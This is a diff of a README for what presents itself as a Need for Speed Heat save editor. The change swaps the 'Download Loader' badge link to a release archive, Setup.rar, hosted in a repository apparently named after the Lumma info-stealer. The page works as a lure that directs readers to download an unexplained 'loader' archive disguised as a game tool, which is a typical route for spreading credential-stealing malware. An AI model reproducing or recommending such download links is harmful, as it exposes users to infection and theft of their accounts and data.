@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for Need for Speed Heat Save Editor
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WADSADF/bvvb323/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rewfdf/Dota2-Lumma/releases/download/main/Setup.rar)
 
 ---
 
@@ -38,6 +38,7 @@ configs/
 `Need-for-Speed-Heat-Save-Editor` · Updated: 2026-10-28
 
 **Tags:** `need-for-speed-heat` `save-editor` `racing` `vehicle-setup` `telemetry` `windows` `steam`
+
 
 
 
